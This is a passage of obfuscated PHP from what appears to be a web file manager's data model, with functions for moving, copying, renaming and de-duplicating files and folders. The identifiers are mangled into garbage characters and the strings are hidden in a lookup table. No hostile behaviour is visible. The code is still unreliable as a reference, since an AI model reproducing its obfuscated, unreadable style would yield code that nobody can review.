$this->_childrenMatch($ÓãÙğšé, $óöë÷µÃ, $ƒ¿–äñä); $”°¾ö·[] = array($£ä¤€¯[181], $Ç˜ğ—‡², $£ä¤€¯[180], $İ‘Áûä[$£ä¤€¯[180]]); $ŸêÚÆ–ò[] = array($£ä¤€¯[181], $Ç˜ğ—‡², $£ä¤€¯[563], $İ‘Áûä[$£ä¤€¯[563]]); $this->_copyApplyMeta($óöë÷µÃ, $àµùøãƒ); if ($óöë÷µÃ[$£ä¤€¯[462]] != $£ä¤€¯[88]) { $àµùøãƒ[$£ä¤€¯[607]][] = $óöë÷µÃ[$£ä¤€¯[518]]; } } $this->chunkEventSet($£ä¤€¯[619], array($£ä¤€¯[620], $‚¤Ñ€ñª, $¡¨üîÒí)); $this->saveAll($”°¾ö·); $this->chunkEventSet($£ä¤€¯[621], array($£ä¤€¯[622], $‚¤Ñ€ñª, $¡¨üîÒí)); $this->saveAll($ŸêÚÆ–ò); return $Ôß•ğğ¹; } private function _childrenMakeRelation($Ëı³‰ƒ, $ÌÁ·Å£ó) { $ëá±Ü¤ü =& $_SERVER[–Ú¬çÁ]; $âŠÒûÈŒ = array(); $”æšëÌó = array(); foreach ($Ëı³‰ƒ as $Ë¾ˆ¦±) { $õŸ×«ìô = $Ë¾ˆ¦±[$ëá±Ü¤ü[32]] . $ëá±Ü¤ü[8] . $Ë¾ˆ¦±[$ëá±Ü¤ü[563]]; $âŠÒûÈŒ[$õŸ×«ìô] = $Ë¾ˆ¦±[$ëá±Ü¤ü[181]]; } foreach ($ÌÁ·Å£ó as $Ë¾ˆ¦±) { $õŸ×«ìô = $Ë¾ˆ¦±[$ëá±Ü¤ü[32]] . $ëá±Ü¤ü[8] . $Ë¾ˆ¦±[$ëá±Ü¤ü[563]]; $£óâ–àÂ = $âŠÒûÈŒ[$õŸ×«ìô]; $”æšëÌó[$£óâ–àÂ] = $Ë¾ˆ¦±[$ëá±Ü¤ü[181]]; } return $”æšëÌó; } private function _childrenMatch($ç·éÙÀË, $†ìû–›ß, $’›°ºƒ§) { $ŞåÈ ²å =& $_SERVER[–Ú¬çÁ]; $ØÙã¼û = $’›°ºƒ§[$ŞåÈ ²å[563]]; $«¿û–» = $this->parentLevelArray($†ìû–›ß[$ŞåÈ ²å[563]]); foreach ($«¿û–» as $Âğ¾õˆÄ) { if (isset($ç·éÙÀË[$Âğ¾õˆÄ])) { $ØÙã¼û .= $ç·éÙÀË[$Âğ¾õˆÄ] . $ŞåÈ ²å[623]; } } $ØÙã¼û = rtrim($ØÙã¼û, $ŞåÈ ²å[50]) . $ŞåÈ ²å[50]; $ÜÑµ½Îì = $this->parentLevelArray($ØÙã¼û); $ÁîÖÃŞı = $ÜÑµ½Îì[count($ÜÑµ½Îì) - 1]; return array($ŞåÈ ²å[180] => $ÁîÖÃŞı, $ŞåÈ ²å[563] => $ØÙã¼û); } private function _makeItemData($¨â›êÀã, $±öŠ¢…Ù, $ÔÜŒÍÄä) { $¤°½Ë³ã =& $_SERVER[–Ú¬çÁ]; $”ƒöŒ° = array($¤°½Ë³ã[624] => $¨â›êÀã[$¤°½Ë³ã[462]], $¤°½Ë³ã[471] => $ÔÜŒÍÄä, $¤°½Ë³ã[625] => $¨â›êÀã[$¤°½Ë³ã[463]] ? $¨â›êÀã[$¤°½Ë³ã[463]] : $¤°½Ë³ã[12], $¤°½Ë³ã[519] => $¨â›êÀã[$¤°½Ë³ã[518]] ? $¨â›êÀã[$¤°½Ë³ã[518]] : 0, $¤°½Ë³ã[595] => $¨â›êÀã[$¤°½Ë³ã[76]] ? $¨â›êÀã[$¤°½Ë³ã[76]] : 0, $¤°½Ë³ã[626] => intval($±öŠ¢…Ù[$¤°½Ë³ã[178]]), $¤°½Ë³ã[627] => intval($±öŠ¢…Ù[$¤°½Ë³ã[548]]), $¤°½Ë³ã[628] => intval(USER_ID), $¤°½Ë³ã[629] => intval(USER_ID), $¤°½Ë³ã[454] => intval($±öŠ¢…Ù[$¤°½Ë³ã[181]]), $¤°½Ë³ã[630] => $±öŠ¢…Ù[$¤°½Ë³ã[563]] . $±öŠ¢…Ù[$¤°½Ë³ã[181]] . $¤°½Ë³ã[50], $¤°½Ë³ã[475] => $¨â›êÀã[$¤°½Ë³ã[85]] ? $¨â›êÀã[$¤°½Ë³ã[85]] : time(), $¤°½Ë³ã[481] => 0, $¤°½Ë³ã[631] => $¤°½Ë³ã[12]); return $”ƒöŒ°; } private function _copyApplyMeta($¾òŞ‘ğ¸, &$×ïïÀ¬Ò) { $Àïù©ç€ =& $_SERVER[–Ú¬çÁ]; $¢æ´­òÖ = $¾òŞ‘ğ¸[$Àïù©ç€[181]]; $ê¸•˜ÜÉ = $¾òŞ‘ğ¸[$Àïù©ç€[32]]; if (!isset($¾òŞ‘ğ¸[$Àïù©ç€[632]]) || !$¾òŞ‘ğ¸[$Àïù©ç€[632]] || $¾òŞ‘ğ¸[$Àïù©ç€[632]] == $Àïù©ç€[222]) { $×ïïÀ¬Ò[$Àïù©ç€[609]][] = array($Àïù©ç€[181], $¢æ´­òÖ, $Àïù©ç€[632], short_id($¢æ´­òÖ)); } if (Input::check($ê¸•˜ÜÉ, $Àïù©ç€[633])) { $×ïïÀ¬Ò[$Àïù©ç€[608]][] = array($Àïù©ç€[181] => $¢æ´­òÖ, $Àïù©ç€[94] => $Àïù©ç€[515], $Àïù©ç€[427] => str_replace($Àïù©ç€[53], $Àïù©ç€[12], Pinyin::get($ê¸•˜ÜÉ))); $×ïïÀ¬Ò[$Àïù©ç€[608]][] = array($Àïù©ç€[181] => $¢æ´­òÖ, $Àïù©ç€[94] => $Àïù©ç€[514], $Àïù©ç€[427] => Pinyin::get($ê¸•˜ÜÉ, $Àïù©ç€[634])); } $×ïïÀ¬Ò[$Àïù©ç€[608]][] = array($Àïù©ç€[181] => $¢æ´­òÖ, $Àïù©ç€[94] => $Àïù©ç€[494], $Àïù©ç€[427] => KodSort::makeStr($ê¸•˜ÜÉ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ØÀ°ëåı) { $÷”¡õùî =& $_SERVER[–Ú¬çÁ]; $Øİ–ı½ˆ = $this->sourceInfo($ØÀ°ëåı); $º©ªô×¦ = $÷”¡õùî[635]; $ƒÇš¸©‡ = array($÷”¡õùî[563] => array($÷”¡õùî[590], $Øİ–ı½ˆ[$÷”¡õùî[563]] . $ØÀ°ëåı . $÷”¡õùî[591]), $÷”¡õùî[482] => $this->targetIsDelete); $ôÑ‘ª”÷ = $this->field($º©ªô×¦)->where($ƒÇš¸©‡)->select(); if (!$ôÑ‘ª”÷) { return; } $ôÑ‘ª”÷ = array_to_keyvalue($ôÑ‘ª”÷, $÷”¡õùî[181]); foreach ($ôÑ‘ª”÷ as $÷»¯Ü) { $ÙÄÄõ±‘ = $÷»¯Ü[$÷”¡õùî[180]]; $ØÀ°ëåı = $÷»¯Ü[$÷”¡õùî[181]]; if (!isset($this->_childrenListCache[$ØÀ°ëåı]) && $÷»¯Ü[$÷”¡õùî[462]] == $÷”¡õùî[88]) { $this->_childrenListCache[$ØÀ°ëåı] = array(); } if (!isset($this->_childrenListCache[$ÙÄÄõ±‘])) { $this->_childrenListCache[$ÙÄÄõ±‘] = array(); } $this->_childrenListCache[$ÙÄÄõ±‘][$ØÀ°ëåı] = $÷»¯Ü; $this->_childrenItemCache[$ØÀ°ëåı] = $÷»¯Ü; } } private function _childrenListAll($¯¡‡„‰š, &$Ÿ§ì) { $“ö¡´ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->_childrenListCache[$¯¡‡„‰š])) { return; } $®Œî¢ı˜ = $this->_childrenListCache[$¯¡‡„‰š]; foreach ($®Œî¢ı˜ as $‰à¯”™ô => $ëş¸ö¹•) { $Ÿ§ì[$‰à¯”™ô] = $ëş¸ö¹•; if ($ëş¸ö¹•[$“ö¡´[462]] == $“ö¡´[88]) { $this->_childrenListAll($‰à¯”™ô, $Ÿ§ì); } } } private function sourceInfoCache($Ã‚ÕÆ—) { if (isset($this->_childrenItemCache[$Ã‚ÕÆ—])) { return $this->_childrenItemCache[$Ã‚ÕÆ—]; } return $this->sourceInfo($Ã‚ÕÆ—); } private function _childrenList($’À›ë©×) { if (isset($this->_childrenListCache[$’À›ë©×])) { return $this->_childrenListCache[$’À›ë©×]; } return $this->_childrenListSelect($’À›ë©×); } private function _childrenListSelect($Å¤™Ô„«) { $ıˆÎéº¤ =& $_SERVER[–Ú¬çÁ]; $í†°¨¨Û = array($ıˆÎéº¤[180] => $Å¤™Ô„«, $ıˆÎéº¤[482] => $this->targetIsDelete); $³ï®“Ô’ = $this->where($í†°¨¨Û)->select(); $³ï®“Ô’ = $³ï®“Ô’ ? $³ï®“Ô’ : array(); $÷·ã…İù = array_to_keyvalue($³ï®“Ô’, $ıˆÎéº¤[181]); $this->_childrenListCache[$Å¤™Ô„«] = $÷·ã…İù; foreach ($÷·ã…İù as $Å¤™Ô„« => $„‹ÈÄÜÚ) { $this->_childrenItemCache[$Å¤™Ô„«] = $„‹ÈÄÜÚ; } return $÷·ã…İù; } private function fileNameExistAuto($‚‘¶¨ÕŠ, $ªï»Ú±·) { $ŸÒÄÃÂ¶ =& $_SERVER[–Ú¬çÁ]; if ($ªï»Ú±·[$ŸÒÄÃÂ¶[482]] == $ŸÒÄÃÂ¶[88]) { return $this->fileNameExist($‚‘¶¨ÕŠ, $ªï»Ú±·[$ŸÒÄÃÂ¶[32]]); } return $this->fileNameExistCache($‚‘¶¨ÕŠ, $ªï»Ú±·[$ŸÒÄÃÂ¶[32]]); } private function fileNameExistCache($ûÓ™», $Æ¤·›¥š) { $º¬ÜûâÅ =& $_SERVER[–Ú¬çÁ]; $Æ¤·›¥š = strtolower($Æ¤·›¥š); $à´òĞš = $this->_childrenList($ûÓ™»); foreach ($à´òĞš as $÷½–ñ¿²) { if ($Æ¤·›¥š == strtolower($÷½–ñ¿²[$º¬ÜûâÅ[32]])) { return $÷½–ñ¿²[$º¬ÜûâÅ[181]]; } } return !1; } private function fileNameAutoCache($«–ã·ö, $’éãÚâì, $üĞØ÷™è, $™Æ³ş¯°) { $Ê ¼ñà =& $_SERVER[–Ú¬çÁ]; $™ëîğç  = $this->_childrenList($«–ã·ö); $“ƒÏ“– = array_to_keyvalue($™ëîğç , $Ê ¼ñà[12], $Ê ¼ñà[32]); return $this->fileNameAutoGet($“ƒÏ“–, $’éãÚâì, $üĞØ÷™è, $™Æ³ş¯°); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ë‘Ã÷§, $®ˆ‘•ˆ½, $¡¬™Ä  = REPEAT_REPLACE, $ø˜ŒŒ“º = '') { $ä†ÊÜé² =& $_SERVER[–Ú¬çÁ]; $“”ÜÒ²Ş = $this->sourceInfo($Ë‘Ã÷§); $‹·Â¦˜ = $this->sourceInfo($®ˆ‘•ˆ½); if ($“”ÜÒ²Ş[$ä†ÊÜé²[180]] == $‹·Â¦˜[$ä†ÊÜé²[181]]) { if ($“”ÜÒ²Ş[$ä†ÊÜé²[482]] == $ä†ÊÜé²[88]) { Model($ä†ÊÜé²[480])->restore(array($Ë‘Ã÷§)); } if (!$ø˜ŒŒ“º || $ø˜ŒŒ“º == $“”ÜÒ²Ş[$ä†ÊÜé²[32]]) { return $Ë‘Ã÷§; } } $…ŸâƒÀ· = $this->pathInfoMore($Ë‘Ã÷§); if ($this->isParentOf($Ë‘Ã÷§, $®ˆ‘•ˆ½)) { return !1; } if (!$“”ÜÒ²Ş || !$‹·Â¦˜ || $‹·Â¦˜[$ä†ÊÜé²[462]] != $ä†ÊÜé²[88]) { return !1; } Hook::trigger($ä†ÊÜé²[636], $…ŸâƒÀ·); $this->targetIsDelete = intval($“”ÜÒ²Ş[$ä†ÊÜé²[482]]); if ($“”ÜÒ²Ş[$ä†ÊÜé²[180]] == $®ˆ‘•ˆ½ && $ø˜ŒŒ“º != $“”ÜÒ²Ş[$ä†ÊÜé²[32]]) { $Ë¹ğíò¤ = $this->fileNameExist($®ˆ‘•ˆ½, $ø˜ŒŒ“º); if ($Ë¹ğíò¤ && $“”ÜÒ²Ş[$ä†ÊÜé²[462]] == $ä†ÊÜé²[222]) { $õ¤˜öè‹ = $this->sourceInfo($Ë¹ğíò¤); $¢¬®×±Š = $this->fileHistory($õ¤˜öè‹, $“”ÜÒ²Ş[$ä†ÊÜé²[518]], $“”ÜÒ²Ş[$ä†ÊÜé²[76]]); if (!$¢¬®×±Š) { Model($ä†ÊÜé²[521])->remove($“”ÜÒ²Ş[$ä†ÊÜé²[518]]); } $this->removeNow($Ë‘Ã÷§, !1); $this->folderSizeReset($®ˆ‘•ˆ½); Hook::trigger($ä†ÊÜé²[637], $…ŸâƒÀ·); return $Ë¹ğíò¤; } } $äå¦µñÇ = $ø˜ŒŒ“º ? $ø˜ŒŒ“º : $“”ÜÒ²Ş[$ä†ÊÜé²[32]]; $this->lockMoveStart($Ë‘Ã÷§); $this->lockWriteStart($®ˆ‘•ˆ½, $äå¦µñÇ); $ø†ıÀŞş = array($ä†ÊÜé²[607] => array(), $ä†ÊÜé²[638] => !1); $this->clearShare($Ë‘Ã÷§, $®ˆ‘•ˆ½); $íÇ±¨´Õ = $this->fileNameExistAuto($®ˆ‘•ˆ½, $“”ÜÒ²Ş); $ÙíÛÑ²Ÿ = $this->_move($Ë‘Ã÷§, $®ˆ‘•ˆ½, $¡¬™Ä , $ø†ıÀŞş, $ø˜ŒŒ“º); $this->sourceCacheClear(); if ($“”ÜÒ²Ş[$ä†ÊÜé²[462]] == $ä†ÊÜé²[88] && $íÇ±¨´Õ) { $this->folderSizeResetChildren($ÙíÛÑ²Ÿ); } Model($ä†ÊÜé²[224])->linkAdd($ø†ıÀŞş[$ä†ÊÜé²[607]]); if ($íÇ±¨´Õ && $ø†ıÀŞş[$ä†ÊÜé²[638]]) { $this->removeNow($Ë‘Ã÷§, !1); } $this->lockMoveEnd($Ë‘Ã÷§); $this->lockWriteEnd($®ˆ‘•ˆ½, $äå¦µñÇ); $this->folderSizeReset($“”ÜÒ²Ş[$ä†ÊÜé²[180]]); $this->folderSizeReset($®ˆ‘•ˆ½); $Ëµ¯‚…º = array($“”ÜÒ²Ş[$ä†ÊÜé²[180]], $®ˆ‘•ˆ½); if ($“”ÜÒ²Ş[$ä†ÊÜé²[462]] == $ä†ÊÜé²[88]) { $Ëµ¯‚…º[] = $Ë‘Ã÷§; } $this->updateModifyTime($Ëµ¯‚…º); Model($ä†ÊÜé²[611])->eventMove($Ë‘Ã÷§, $“”ÜÒ²Ş[$ä†ÊÜé²[180]], $®ˆ‘•ˆ½); Hook::trigger($ä†ÊÜé²[637], $…ŸâƒÀ·); return $ÙíÛÑ²Ÿ; } private function _move($•Ö·½ ü, $ø…œÛØã, $ÆÚ„’§Š, &$ŸÏ³ÅÍÇ, $ô»ÎÄü = '') { $²¬ü…¥€ =& $_SERVER[–Ú¬çÁ]; $©ñê = $this->sourceInfo($•Ö·½ ü); $öş›Ú‚ã = $©ñê[$²¬ü…¥€[462]] == $²¬ü…¥€[88]; $º——ÔÀ™ = $ô»ÎÄü ? $ô»ÎÄü : $©ñê[$²¬ü…¥€[32]]; $‚åÜ•ŞÍ = $this->fileNameExistAuto($ø…œÛØã, $©ñê); $this->lockMoveStart($•Ö·½ ü); $this->lockWriteStart($ø…œÛØã, $º——ÔÀ™); if (!$‚åÜ•ŞÍ) { return $this->_moveForce($•Ö·½ ü, $ø…œÛØã, $º——ÔÀ™); } $ª½Èşîœ = $‚åÜ•ŞÍ; $åÑ¤¹Ûõ = !1; if ($öş›Ú‚ã) { if ($ÆÚ„’§Š == REPEAT_RENAME_FOLDER) { $º——ÔÀ™ = $this->fileNameAuto($ø…œÛØã, $º——ÔÀ™, $ÆÚ„’§Š, $öş›Ú‚ã); $ª½Èşîœ = $this->_moveForce($•Ö·½ ü, $ø…œÛØã, $º——ÔÀ™); } else { if ($ÆÚ„’§Š == REPEAT_RENAME_FOLDER) { $ÆÚ„’§Š = REPEAT_RENAME; } $›½¤ĞÑ¾ = $this->_childrenListSelect($•Ö·½ ü); foreach ($›½¤ĞÑ¾ as $¯ùåıĞ) { $this->_move($¯ùåıĞ[$²¬ü…¥€[181]], $‚åÜ•ŞÍ, $ÆÚ„’§Š, $ŸÏ³ÅÍÇ); } $åÑ¤¹Ûõ = !0; } } else { if ($ÆÚ„’§Š == REPEAT_SKIP) { $åÑ¤¹Ûõ = !0; } else { if ($ÆÚ„’§Š == REPEAT_RENAME || $ÆÚ„’§Š == REPEAT_RENAME_FOLDER) { $º——ÔÀ™ = $this->fileNameAuto($ø…œÛØã, $º——ÔÀ™, $ÆÚ„’§Š, $öş›Ú‚ã); $ª½Èşîœ = $this->_moveForce($•Ö·½ ü, $ø…œÛØã, $º——ÔÀ™); } else { if ($ÆÚ„’§Š == REPEAT_REPLACE) { $ô‡ñ×Øì = $this->sourceInfoCache($‚åÜ•ŞÍ); $„—åÂ¢ı = $this->fileHistory($ô‡ñ×Øì, $©ñê[$²¬ü…¥€[518]], $©ñê[$²¬ü…¥€[76]]); $åÑ¤¹Ûõ = !0; if ($„—åÂ¢ı) { $ŸÏ³ÅÍÇ[$²¬ü…¥€[607]][] = $©ñê[$²¬ü…¥€[518]]; } } } } } if ($åÑ¤¹Ûõ && !$ŸÏ³ÅÍÇ[$²¬ü…¥€[638]]) { $ŸÏ³ÅÍÇ[$²¬ü…¥€[638]] = !0; } return $ª½Èşîœ; } private function _moveForce($êş´×­ª, $§ŒñùÈõ, $¥ø•à¬‚) { $ ÛÎ¡´‰ =& $_SERVER[–Ú¬çÁ]; $üÈà¡²¡ = $this->sourceInfo($êş´×­ª); $á—Üî½ = $this->sourceInfo($§ŒñùÈõ); $áŠ«—äÆ = $üÈà¡²¡[$ ÛÎ¡´‰[462]] == $ ÛÎ¡´‰[88]; $êµäí¼¡ = array($ ÛÎ¡´‰[454] => $á—Üî½[$ ÛÎ¡´‰[181]], $ ÛÎ¡´‰[630] => $á—Üî½[$ ÛÎ¡´‰[563]] . $á—Üî½[$ ÛÎ¡´‰[181]] . $ ÛÎ¡´‰[50], $ ÛÎ¡´‰[626] => $á—Üî½[$ ÛÎ¡´‰[178]], $ ÛÎ¡´‰[627] => $á—Üî½[$ ÛÎ¡´‰[548]], $ ÛÎ¡´‰[629] => USER_ID, $ ÛÎ¡´‰[471] => $¥ø•à¬‚); $†ÜÙ±ñ = $üÈà¡²¡[$ ÛÎ¡´‰[178]] == SourceModel::TYPE_GROUP && $á—Üî½[$ ÛÎ¡´‰[178]] == SourceModel::TYPE_GROUP && $üÈà¡²¡[$ ÛÎ¡´‰[548]] == $á—Üî½[$ ÛÎ¡´‰[548]]; if (!$†ÜÙ±ñ && $this->moveClearAuth) { Model($ ÛÎ¡´‰[545])->authClear($êş´×­ª); } $±ıÈ”õÙ = $üÈà¡²¡[$ ÛÎ¡´‰[482]] == $ ÛÎ¡´‰[88] && $á—Üî½[$ ÛÎ¡´‰[482]] != $ ÛÎ¡´‰[88]; if ($±ıÈ”õÙ) { $êµäí¼¡[$ ÛÎ¡´‰[481]] = 0; } if ($áŠ«—äÆ) { $Ìàª…· = array($ ÛÎ¡´‰[630] => array($ ÛÎ¡´‰[590], $üÈà¡²¡[$ ÛÎ¡´‰[563]] . $üÈà¡²¡[$ ÛÎ¡´‰[181]] . $ ÛÎ¡´‰[591])); $ŞØÁ¢¢… = $üÈà¡²¡[$ ÛÎ¡´‰[563]] . $üÈà¡²¡[$ ÛÎ¡´‰[181]] . $ ÛÎ¡´‰[50]; $¢ ÙÑ‘ = $á—Üî½[$ ÛÎ¡´‰[563]] . $á—Üî½[$ ÛÎ¡´‰[181]] . $ ÛÎ¡´‰[50] . $üÈà¡²¡[$ ÛÎ¡´‰[181]] . $ ÛÎ¡´‰[50]; $™¼ˆ£ÊÉ = array($ ÛÎ¡´‰[630] => array($ ÛÎ¡´‰[639], "\162\x65\160\154\141\x63\x65\50\x70\141\x72\x65\156\164\x4c\145\166\145\154\54\47{$ŞØÁ¢¢…}\47\54\x27{$¢ ÙÑ‘}\x27\x29"), $ ÛÎ¡´‰[626] => $á—Üî½[$ ÛÎ¡´‰[178]], $ ÛÎ¡´‰[627] => $á—Üî½[$ ÛÎ¡´‰[548]]); if ($±ıÈ”õÙ) { $™¼ˆ£ÊÉ[$ ÛÎ¡´‰[481]] = 0; } $this->where($Ìàª…·)->data($™¼ˆ£ÊÉ)->save(); } $this->where(array($ ÛÎ¡´‰[468] => $êş´×­ª))->data($êµäí¼¡)->save(); return $êş´×­ª; } private function clearShare($Î°ñº¤‘, $ÁŸŞ’«œ) { $´ä±„ğ =& $_SERVER[–Ú¬çÁ]; $‡•£ş‰Í = $this->sourceInfo($Î°ñº¤‘); $œòæ£ì© = $this->sourceInfo($ÁŸŞ’«œ); if ($‡•£ş‰Í[$´ä±„ğ[548]] == $œòæ£ì©[$´ä±„ğ[548]] && $‡•£ş‰Í[$´ä±„ğ[178]] == $´ä±„ğ[640]) { return; } $¡§«Íš = array($´ä±„ğ[563] => array($´ä±„ğ[590], $‡•£ş‰Í[$´ä±„ğ[563]] . $Î°ñº¤‘ . $´ä±„ğ[591])); $›ˆÈ‘ñ¾ = $this->field($´ä±„ğ[468])->where($¡§«Íš)->getField($´ä±„ğ[181], !0); if (!$›ˆÈ‘ñ¾) { return; } $¡§«Íš = array($´ä±„ğ[181] => array($´ä±„ğ[7], $›ˆÈ‘ñ¾), $´ä±„ğ[641] => 1); $À™„åÙÙ = Model($´ä±„ğ[642])->field($´ä±„ğ[643])->where($¡§«Íš)->select(); if (!$À™„åÙÙ) { return; } $À™„åÙÙ = array_to_keyvalue($À™„åÙÙ, $´ä±„ğ[12], $´ä±„ğ[643]); $¡§«Íš = array($´ä±„ğ[643] => array($´ä±„ğ[7], $À™„åÙÙ)); Model($´ä±„ğ[642])->where($¡§«Íš)->save(array($´ä±„ğ[641] => 0)); Model($´ä±„ğ[644])->where($¡§«Íš)->delete(); } public function copyFolderFromIO($âÒÕô¶, $ñè¾«ì, $˜µöñ¦¤, $ëâÀ·ì, $ö´Ö¯, $†×ÀƒÊ = false) { $°®ÕÏ¼™ =& $_SERVER[–Ú¬çÁ]; $¬šİ‘• = array($°®ÕÏ¼™[608] => array(), $°®ÕÏ¼™[609] => array(), $°®ÕÏ¼™[607] => array(), $°®ÕÏ¼™[645] => array()); $ûèÆˆ­ = $†×ÀƒÊ ? $†×ÀƒÊ : $âÒÕô¶->pathThis($ñè¾«ì); $¶Å¦£ˆ = $this->fileNameExist($˜µöñ¦¤, $ûèÆˆ­); $İÑ˜Ğà = $this->mkdir($˜µöñ¦¤, $ûèÆˆ­, $ëâÀ·ì); if (!$¶Å¦£ˆ || $ëâÀ·ì == REPEAT_RENAME_FOLDER) { $ëâÀ·ì = !1; } if ($¶Å¦£ˆ) { $this->_childrenAllMake($¶Å¦£ˆ); } Hook::trigger($°®ÕÏ¼™[646]); $this->_copyChildTo($âÒÕô¶, $ñè¾«ì, $İÑ˜Ğà, $ëâÀ·ì, $¬šİ‘•, $ö´Ö¯); Hook::trigger($°®ÕÏ¼™[647]); if ($İÑ˜Ğà) { $this->folderSizeResetChildren($İÑ˜Ğà); } $this->_childrenListClear(); Model($°®ÕÏ¼™[610])->addAll($¬šİ‘•[$°®ÕÏ¼™[608]], array(), !0); Model($°®ÕÏ¼™[611])->eventCopy($İÑ˜Ğà); $this->saveAll($¬šİ‘•[$°®ÕÏ¼™[609]]); Model($°®ÕÏ¼™[521])->linkAdd($¬šİ‘•[$°®ÕÏ¼™[607]]); Model($°®ÕÏ¼™[521])->remove($¬šİ‘•[$°®ÕÏ¼™[645]]); $this->folderSizeReset($˜µöñ¦¤); $this->updateModifyTime($˜µöñ¦¤); return $İÑ˜Ğà; } private function _copyChildTo($¢ƒÉÄ¶, $Ä²€İÊ˜, $ºø±Ûå¢, $±á™ŒÜ¼, &$¾±ôÒºê, $§åâÀ…—) { $î•ç‘ªŠ =& $_SERVER[–Ú¬çÁ]; $²´Ö¿ïÚ = $this->sourceInfoCache($ºø±Ûå¢); $Èƒ¤ÌÕÁ = $¢ƒÉÄ¶->listPath($Ä²€İÊ˜); $Èƒ¤ÌÕÁ = $Èƒ¤ÌÕÁ ? $Èƒ¤ÌÕÁ : array($î•ç‘ªŠ[83] => array(), $î•ç‘ªŠ[82] => array()); $°äËñÄÓ = array_merge($Èƒ¤ÌÕÁ[$î•ç‘ªŠ[83]], $Èƒ¤ÌÕÁ[$î•ç‘ªŠ[82]]); $¯ãó¡ÆÈ = $this->_addFiles($¢ƒÉÄ¶, $Èƒ¤ÌÕÁ[$î•ç‘ªŠ[83]], $§åâÀ…—); $ˆï²µŒ = array(); foreach ($°äËñÄÓ as &$×äøşŸ) { if (isset($¯ãó¡ÆÈ[$×äøşŸ[$î•ç‘ªŠ[32]]])) { $×äøşŸ = $¯ãó¡ÆÈ[$×äøşŸ[$î•ç‘ªŠ[32]]]; } $×äøşŸ[$î•ç‘ªŠ[462]] = $×äøşŸ[$î•ç‘ªŠ[33]] == $î•ç‘ªŠ[75]; $×äøşŸ[$î•ç‘ªŠ[463]] = substr(_get($×äøşŸ, $î•ç‘ªŠ[175], $î•ç‘ªŠ[12]), 0, 10); $×äøşŸ[$î•ç‘ªŠ[76]] = _get($×äøşŸ, $î•ç‘ªŠ[76], 0); $×äøşŸ[$î•ç‘ªŠ[518]] = _get($×äøşŸ, $î•ç‘ªŠ[518], 0); if (!isset($×äøşŸ[$î•ç‘ªŠ[648]]) && $×äøşŸ[$î•ç‘ªŠ[518]]) { $¾±ôÒºê[$î•ç‘ªŠ[645]][] = $×äøşŸ[$î•ç‘ªŠ[518]]; } if ($±á™ŒÜ¼) { $÷¨İÈ”æ = $this->fileNameExistCache($ºø±Ûå¢, $×äøşŸ[$î•ç‘ªŠ[32]]); if ($÷¨İÈ”æ) { if ($×äøşŸ[$î•ç‘ªŠ[462]] || $±á™ŒÜ¼ == REPEAT_SKIP) { continue; } if ($±á™ŒÜ¼ == REPEAT_REPLACE) { $„ÆĞ©ÅÊ = $this->sourceInfoCache($÷¨İÈ”æ); $³†ÌúğÛ = $this->fileHistory($„ÆĞ©ÅÊ, $×äøşŸ[$î•ç‘ªŠ[518]], $×äøşŸ[$î•ç‘ªŠ[76]]); if ($³†ÌúğÛ) { $¾±ôÒºê[$î•ç‘ªŠ[607]][] = $×äøşŸ[$î•ç‘ªŠ[518]]; } continue; } else { if ($±á™ŒÜ¼ == REPEAT_RENAME) { $×äøşŸ[$î•ç‘ªŠ[32]] = $this->fileNameAutoCache($ºø±Ûå¢, $×äøşŸ[$î•ç‘ªŠ[32]], $±á™ŒÜ¼, !1); } } } } if (!$×äøşŸ[$î•ç‘ªŠ[462]] && $×äøşŸ[$î•ç‘ªŠ[518]] == 0) { continue; } if (!$×äøşŸ[$î•ç‘ªŠ[462]] && $×äøşŸ[$î•ç‘ªŠ[518]]) { $¾±ôÒºê[$î•ç‘ªŠ[607]][] = $×äøşŸ[$î•ç‘ªŠ[518]]; } $ˆï²µŒ[] = $this->_makeItemData($×äøşŸ, $²´Ö¿ïÚ, $×äøşŸ[$î•ç‘ªŠ[32]]); } unset($×äøşŸ); if (!empty($ˆï²µŒ)) { $this->addAll($ˆï²µŒ); $this->_childrenListSelect($ºø±Ûå¢); } $ùãñÂ“‚ = $this->_childrenList($ºø±Ûå¢); $ùãñÂ“‚ = array_to_keyvalue($ùãñÂ“‚, $î•ç‘ªŠ[32]); foreach ($°äËñÄÓ as $×äøşŸ) { $„ÆĞ©ÅÊ = $ùãñÂ“‚[$×äøşŸ[$î•ç‘ªŠ[32]]]; $ìË©îÔÁ = $„ÆĞ©ÅÊ[$î•ç‘ªŠ[181]]; $this->_copyApplyMeta($„ÆĞ©ÅÊ, $¾±ôÒºê); if ($×äøşŸ[$î•ç‘ªŠ[33]] == $î•ç‘ªŠ[75]) { $×äøşŸ[$î•ç‘ªŠ[84]] = $¢ƒÉÄ¶->getPathInner($×äøşŸ[$î•ç‘ªŠ[84]]); $this->_copyChildTo($¢ƒÉÄ¶, $×äøşŸ[$î•ç‘ªŠ[84]], $ìË©îÔÁ, $±á™ŒÜ¼, $¾±ôÒºê, $§åâÀ…—); } } } private function _addFiles($¹¸¶ëèº, $úã³øõ, $Œ¥«üµè) { $”Ñ²™¶ =& $_SERVER[–Ú¬çÁ]; if (!$úã³øõ || count($úã³øõ) == 0) { return array(); } $•êŸ‰…û = array(); foreach ($úã³øõ as &$¤šõı·È) { Hook::trigger($”Ñ²™¶[649], $¤šõı·È); $¤šõı·È[$”Ñ²™¶[84]] = $¹¸¶ëèº->getPathInner($¤šõı·È[$”Ñ²™¶[84]]); $¡ªğ±ŒŞ = $¹¸¶ëèº->hashSimple($¤šõı·È[$”Ñ²™¶[84]]); $»¬°›îË = $¹¸¶ëèº->hashMd5($¤šõı·È[$”Ñ²™¶[84]]); if (strlen($»¬°›îË) > 10 && !isset($•êŸ‰…û[$»¬°›îË])) { $•êŸ‰…û[$»¬°›îË] = array(); } $¤šõı·È[$”Ñ²™¶[650]] = $¡ªğ±ŒŞ; $¤šõı·È[$”Ñ²™¶[524]] = $»¬°›îË; $•êŸ‰…û[$»¬°›îË][] =& $¤šõı·È; if (count($•êŸ‰…û[$»¬°›îË]) > 1) { $¤šõı·È[$”Ñ²™¶[648]] = !0; } Hook::trigger($”Ñ²™¶[651], $¤šõı·È); } unset($¤šõı·È); $³¯»öôê = array($”Ñ²™¶[524] => array($”Ñ²™¶[7], array_keys($•êŸ‰…û))); $Ö†üŞ = Model($”Ñ²™¶[652]); $‡ü®×áî = 